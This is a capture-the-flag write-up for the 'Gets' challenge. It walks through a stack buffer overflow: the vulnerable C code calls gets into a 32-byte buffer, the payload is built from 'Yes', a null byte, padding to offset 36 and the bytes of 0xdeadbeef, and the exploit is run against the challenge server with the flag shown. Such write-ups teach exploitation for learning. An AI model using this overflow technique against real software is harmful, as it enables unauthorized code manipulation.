# Gets
>My favorite libc function is gets. I am very confident in its security. Connect with
nc gets.litctf.live 1337
>
>133 solves / 120 points

We are given gets.c and the gets binary

Two checks:

1. Strcmp(buf, "Yes")
2. debug==0xdeadbeef

```
long debug = 0; 
char buf[0x20];
gets(buf);

if(strcmp(buf, "Yes") == 0){
                puts("I'm glad you understand.");
                if(debug == 0xdeadbeef){
```

Binary is in little endian, so when creating payload need to reverse 0xdeadbeef

Need to overwrite the buf variable so that it will overflow into the long debug local variable.

For checks:
1. Yes\0 + NOP till debug variable
2. \xef\xbe\xad\xde

At first I brute forced from 30 to 40 (see run.bash) as I didn't know how to calculate the offset. I knew that the buf variable had a buffer size of 32 bytes, so it was somewhere there.

Offset: 32 bytes (char buf[0x20];) + 4 bytes 

```
$ python gets.py 36 | nc gets.litctf.live 1337
== proof-of-work: disabled ==
Gets is very secure. You may see other sources tell you otherwise, but they are wrong.
Geeksforgeeks says gets is insecure. G4g also says graph coloring can be solved in O(n).
Wikipedia says gets is insecure. Anyone can write anything on wikipedia, it is unreliable.
The linux docs say gets is insecure. No one reads the linux docs except stuck up nerds.
My compiler warned me gets is insecure. My compiler also can't add semicolons automatically
Hopefully you can see that gets is in fact secure, and all who tell you otherwise are lying.

Are you starting to understand?
I'm glad you understand.
Debug info:
flag{d0_y0u_g3ts_1t}
```
